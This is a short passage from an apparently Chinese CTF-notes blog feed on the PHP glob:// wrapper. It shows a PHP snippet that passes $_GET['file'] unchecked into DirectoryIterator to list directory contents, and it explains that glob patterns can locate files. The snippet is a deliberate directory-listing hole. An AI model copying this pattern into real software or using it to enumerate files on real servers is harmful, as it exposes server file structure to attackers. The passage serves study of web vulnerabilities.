-<h2 id="glob-—-我来了就是查寝来了"><a href="#glob-—-我来了就是查寝来了" class="headerlink" title="glob:// — 我来了就是查寝来了"></a>glob:// — 我来了就是查寝来了</h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面这段代码实现了一个简单的文件查看器的功能。</p>
-<p><img src="/images/BUU/202112262150620.png"></p>
-<p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p>
-<p><img src="/images/BUU/202112262157376.png"></p>
-]]></content>
-      <tags>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
